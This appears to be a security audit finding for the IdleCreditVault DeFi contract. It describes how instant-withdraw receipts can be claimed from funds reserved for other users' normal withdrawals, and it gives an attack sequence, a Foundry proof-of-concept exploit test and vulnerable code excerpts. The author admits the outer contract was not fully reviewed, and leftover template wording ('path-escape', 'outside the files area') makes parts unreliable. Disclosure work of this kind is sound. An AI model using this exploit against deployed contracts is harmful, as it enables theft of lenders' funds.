### Title
Instant-withdraw receipts can claim underlying funded for other users' normal withdraw requests — `claimInstantWithdrawRequest` pays out of the shared strategy balance with no funding/epoch check - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.claimInstantWithdrawRequest` pays `instantWithdrawsRequests[_user]` directly from the vault's underlying balance via `_transferFundedClaim`, with no check that the request's epoch was actually funded through `collectInstantWithdrawFunds` and no epoch-wait gate analogous to `epochNumber <= lastWithdrawRequest[_user]` in `_claimFundedWithdrawRequest`. Any underlying sitting in the strategy — in particular funds collected via `collectWithdrawFunds` that are reserved for matured normal withdraw receipts — is reachable ("outside the files area") by any holder of an instant-withdraw receipt. [1](#0-0) [2](#0-1) 

### Finding Description
The analog of the path-escape bug (a resource written/read outside its designated area) is a claim scope escape: instant-withdraw receipts are supposed to be paid only from funds the CDO collects for them through `getInstantWithdrawFunds` → `collectInstantWithdrawFunds` (which decrements `pendingInstantWithdraws` and pulls tokens into the strategy). [3](#0-2)  However, `claimInstantWithdrawRequest` simply reads the aggregate `instantWithdrawsRequests[_user]`, burns the receipt tokens, and calls `_transferFundedClaim`, which transfers any underlying held by the strategy except `defaultRecoveryReserve`. [4](#0-3) 

Attack sequence (running epoch, fixed-APR mode):

1. Victim calls `requestWithdraw` in epoch N; epoch N stops and the borrower funds it: `collectWithdrawFunds` transfers the full `pendingWithdraws` amount into the strategy. These tokens now sit in the vault backing the victim's claim. [5](#0-4) 
2. Attacker (KYC-passing lender) deposits into a tranche, then calls `requestInstantWithdraw(_amount, attacker)` — minting themselves receipt tokens and registering `instantWithdrawsRequests[attacker] += _amount`. No funded-epoch check exists. [6](#0-5) 
3. Before `getInstantWithdrawFunds`/`collectInstantWithdrawFunds` ever runs for the attacker, the attacker calls `claimInstantWithdrawRequest`. The function burns the receipt and `_transferFundedClaim` sends `amount` underlying — sourced from the victim's funded withdraw reserve — to the attacker. [4](#0-3) 
4. Victim's later `claimWithdrawRequest` → `_claimFundedWithdrawRequest` → `_transferFundedClaim` reverts on insufficient balance: permanent freezing/theft of the victim's matured claim. [7](#0-6) 

The broken invariant is "one receipt, one payout from its own funded bucket": instant receipts are fungible against the whole non-reserve balance rather than only against amounts collected for their epoch. The same escape applies to `sendInterestAndDeposits`/post-startEpoch held funds and any balance reserved for other claimants.

### Impact Explanation
Direct theft of other users' funded withdraw payouts up to the attacker's instant-request size. The victim's claim becomes permanently unpayable (the strategy has no mechanism to re-pull the shortfall from the borrower), so this is theft plus permanent freezing of unclaimed withdraw funds, quantifiable as `min(attacker instant request, funded underlying balance)`.

### Likelihood Explanation
Requires only: (a) the strategy holding funded-but-unclaimed underlying (common — `collectWithdrawFunds` pre-funds claims that users may leave unclaimed across epochs), and (b) the attacker passing the instant-withdraw request path through the CDO (instant mode vaults permit this during running epochs). No privileged role is needed; the attacker funds the position with their own deposit. I could not fully read `IdleCDOEpochVariant.requestInstantWithdraw`/`claimInstantWithdrawRequest` within the exploration limit, so the outer CDO may impose timing or mode gating that constrains step 2–3; the strategy-level absence of any epoch/funding check remains the root cause.

### Recommendation
Track funded instant payouts per epoch (e.g., an `instantWithdrawFundedByEpoch` counter set in `collectInstantWithdrawFunds`) and have `claimInstantWithdrawRequest` only pay receipts whose epoch's funding was actually collected — mirroring the `epochNumber <= lastWithdrawRequest` gate and the per-epoch accounting already used for normal requests (`withdrawsRequestsByEpoch`, `lossRecoveryPriceByEpoch`). At minimum, revert when `pendingInstantWithdraws` for the user's request epoch has not been collected.

// Foundry fork PoC (test/foundry/IdleCreditVault.t.sol harness)
function testInstantWithdrawDrainsFundedNormalClaim() external {
    // victim deposits and requests normal withdraw
    address victim = makeAddr('victim');
    _depositWithUser(victim, 10000 * ONE_SCALE, true);
    vm.prank(victim);
    uint256 victimReq = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // epoch ends, borrower funds pendingWithdraws -> underlying now sits in strategy
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());
    assertGt(underlying.balanceOf(address(strategy)), 0);

    // attacker deposits and registers an instant withdraw receipt
    uint256 minted = idleCDO.depositAA(victimReq); // attacker = this contract
    _transferBurnedTrancheTokens(address(this), true);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // instant-mode request -> strategy.requestInstantWithdraw

    // claim immediately, before collectInstantWithdrawFunds funds this epoch
    uint256 pre = underlying.balanceOf(address(this));
    cdoEpoch.claimInstantWithdrawRequest();
    assertGt(underlying.balanceOf(address(this)) - pre, 0, 'attacker paid from victim reserve');

    // victim claim now fails: funded balance was taken
    vm.prank(victim);
    vm.expectRevert();
    cdoEpoch.claimWithdrawRequest();
}

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;

  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
